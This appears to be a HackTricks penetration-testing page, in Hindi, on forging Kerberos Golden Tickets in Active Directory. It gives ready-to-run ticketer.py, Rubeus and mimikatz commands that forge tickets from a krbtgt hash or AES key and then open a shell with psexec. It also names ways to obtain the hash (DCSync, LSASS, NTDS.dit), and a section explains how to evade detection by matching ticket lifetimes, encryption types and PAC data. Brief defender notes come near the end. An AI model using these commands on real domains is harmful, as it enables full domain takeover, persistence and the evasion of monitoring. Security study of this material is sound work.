# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

एक **Golden Ticket** attack में **Active Directory (AD) krbtgt account के NTLM hash** का उपयोग करके **किसी भी user की impersonation करते हुए एक legitimate Ticket Granting Ticket (TGT) बनाना** शामिल है। यह technique विशेष रूप से लाभदायक है क्योंकि यह **domain के भीतर किसी भी service या machine तक access सक्षम करती है**, impersonated user के रूप में। यह याद रखना महत्वपूर्ण है कि **krbtgt account के credentials कभी भी automatically update नहीं होते**।

**krbtgt account का NTLM hash प्राप्त** करने के लिए, विभिन्न methods का उपयोग किया जा सकता है। इसे **Local Security Authority Subsystem Service (LSASS) process** या **NT Directory Services (NTDS.dit) file** से निकाला जा सकता है, जो domain के किसी भी Domain Controller (DC) पर स्थित होती है। इसके अलावा, **DCsync attack execute करना** इस NTLM hash को प्राप्त करने की एक और strategy है, जिसे **Mimikatz में lsadump::dcsync module** या **Impacket द्वारा secretsdump.py script** जैसे tools का उपयोग करके किया जा सकता है। यह ज़ोर देना महत्वपूर्ण है कि इन operations को करने के लिए आमतौर पर **domain admin privileges या समान स्तर की access** की आवश्यकता होती है।

हालाँकि NTLM hash इस purpose के लिए एक viable method है, operational security reasons के लिए **Advanced Encryption Standard (AES) Kerberos keys (AES128 and AES256) का उपयोग करके tickets forge करना strongly recommended** है। आधुनिक domains में यह और भी महत्वपूर्ण है क्योंकि **RC4 usage को phase out किया जा रहा है** और यह Kerberos telemetry में कहीं अधिक स्पष्ट रूप से दिखाई देता है।
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### आधुनिक ticket crafting notes

जब संभव हो, पहले **LDAP और SYSVOL query** करें और फिर real domain policy और user PAC values का उपयोग करके ticket forge करें, बजाय इन्हें manually invent करने के:
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` DC से user, group, NetBIOS और policy data मांगता है, जिनका उपयोग एक अधिक realistic PAC बनाने के लिए किया जाता है।
- `/printcmd` retrieved PAC fields के साथ एक offline command line print करता है, जो useful है यदि आप later LDAP को फिर से touch किए बिना same ticket forge करना चाहते हैं।
- `/extendedupndns` नए `UpnDns` PAC elements जोड़ता है, जिनमें `samAccountName` और account SID शामिल हैं।
- `/oldpac` नए `Requestor` और `Attributes` PAC buffers हटाता है; यह मुख्य रूप से older environments के against compatibility testing के लिए useful है, default tradecraft के लिए नहीं।

Linux से, recent Impacket versions भी newer PAC structures जोड़ने और realistic validity period set करने का support करती हैं:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` **घंटों** में है। डिफ़ॉल्ट **10 years** है, जो noisy है।
- `-extra-pac` नया `UPN_DNS` PAC information जोड़ता है।
- `-old-pac` legacy PAC layout को force करता है।
- `-extra-sid` तब उपयोगी है जब PAC को अतिरिक्त SIDs चाहिए हों (उदाहरण के लिए, child-to-parent escalation scenarios में, जिन्हें [SID-History Injection](sid-history-injection.md) में cover किया गया है)।

**Once** आपने **golden Ticket injected** कर लिया, आप shared files **(C$)** access कर सकते हैं, और services तथा WMI execute कर सकते हैं, इसलिए आप shell पाने के लिए **psexec** या **wmiexec** का उपयोग कर सकते हैं (लगता है कि winrm via shell नहीं मिल सकता)।

### Bypassing common detections

golden ticket detect करने के सबसे frequent तरीके हैं wire पर **Kerberos traffic** का **inspecting** करना। Default रूप से, Mimikatz **TGT को 10 years के लिए signs** करता है, जो इससे किए गए subsequent TGS requests में anomalous के रूप में अलग दिखेगा।

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Start offset, duration और maximum renewals (सभी minutes में) control करने के लिए `/startoffset`, `/endin` और `/renewmax` parameters का उपयोग करें।
```
Get-DomainPolicy | select -expand KerberosPolicy
```
दुर्भाग्य से, TGT की lifetime 4769 में log नहीं होती, इसलिए आपको यह जानकारी Windows event logs में नहीं मिलेगी। हालांकि, आप जो correlate कर सकते हैं वह है **4769's को पहले 4768 के बिना देखना**। **TGT के बिना TGS request करना संभव नहीं है**, और अगर TGT issue होने का कोई record नहीं है, तो हम infer कर सकते हैं कि इसे offline forge किया गया था।

**नए Windows builds** में, Event IDs **4768** और **4769** अब बहुत बेहतर **encryption type telemetry** भी expose करते हैं। एक forged TGT/TGS जो **RC4 (`0x17`)** का उपयोग करता है, ऐसे domain में जहाँ `krbtgt`, clients और services के पास पहले से AES keys हैं, कुछ साल पहले की तुलना में पकड़ना कहीं आसान है। यह एक और कारण है **AES-backed Golden Tickets** को prefer करने का और domain की normal Kerberos policy से जितना संभव हो उतना closely match करने का।

एक और OPSEC issue है **PAC fidelity**। Impossible group memberships वाले tickets, missing newer PAC buffers, या ऐसा account metadata जो LDAP से match नहीं करता, defenders जब PAC contents को AD data के against validate करते हैं, तब detect करना आसान होता है। अगर आपको ऐसा TGT चाहिए जो सच में किसी DC द्वारा issue किया हुआ लगे, तो review करें:

{{#ref}}
diamond-ticket.md
{{#endref}}

Persistence के लिए **environmental limits** भी होते हैं। `krbtgt` account **password history of 2** रखता है, इसलिए एक forged TGT **पहले** `krbtgt` reset के बाद भी valid रह सकता है, अगर वह previous key से signed था। इसी वजह से defenders Golden Tickets को **`krbtgt` को दो बार reset** करके और resets के बीच domain की maximum ticket lifetime जितना कम से कम इंतज़ार करके invalidate करते हैं।

इस detection को **bypass** करने के लिए diamond tickets देखें।

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Defenders के लिए कुछ और छोटे tricks हैं **sensitive users** जैसे default domain administrator account के लिए **4769's पर alert** करना और उन domains में **krbtgt के लिए RC4 usage** पर alert करना जो normally AES tickets issue करते हैं।

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
